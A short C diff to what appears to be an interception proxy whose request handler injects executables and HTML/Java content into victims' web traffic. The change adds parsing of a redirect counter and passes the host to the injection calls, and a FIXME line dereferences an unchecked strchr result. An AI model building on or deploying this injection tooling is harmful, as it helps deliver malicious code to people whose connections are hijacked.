@@ -96,7 +96,7 @@ MY_THREAD_FUNC(handle_connection)
    char data[READ_BUFF_SIZE];
    char *request_end = NULL;
    int len, written;
-   char *host, *tag, *th = NULL;
+   char *host, *tag, *counter, *th = NULL;
    char *url = NULL;
    char *rsrc = NULL;
    char *p, *q;
@@ -160,6 +160,11 @@ MY_THREAD_FUNC(handle_connection)
    if ((p = strchr(th, '.')) != NULL)
       *p = 0;
 
+   /* redir counter */
+   counter = p + 1;
+   if ((p = strchr(counter, '.')) != NULL)
+      *p = 0;
+
    /* then we have the host */
    host = p + 1;
    if ((p = strchr(host, '\r')) != NULL || (p = strchr(host, '\n')) != NULL)
@@ -209,7 +214,7 @@ MY_THREAD_FUNC(handle_connection)
             mangle_request(request, request_end);
 
             /* perform the connection (with injection) */
-            proxy_inject_exe(&cbio, &sbio, request, req->path);
+            proxy_inject_exe(&cbio, &sbio, request, req->path, host);
             break;
 
          case REQ_TYPE_INJECT_HTML_JAVA:
@@ -218,7 +223,7 @@ MY_THREAD_FUNC(handle_connection)
             mangle_request(request, request_end);
 
             /* perform the connection (with injection) */
-            proxy_inject_html(&cbio, &sbio, request, req->path, req->tag);
+            proxy_inject_html(&cbio, &sbio, request, req->path, req->tag, host);
             break;
 
          case REQ_TYPE_INJECT_HTML_FLASH:
@@ -320,6 +325,9 @@ void mangle_request(char *request, char *request_end)
    /* skip the tag */
    q = strchr(begin, '.') + 1;
 
+   /* skip the counter */ //FIXME
+
+   q = strchr(q, '.') + 1;
    /* check if it was a plain ip address (mangled by match_url.c)
     * in this case we have:
     *    in-addr-jjj-yyy-zzz-kkk.net
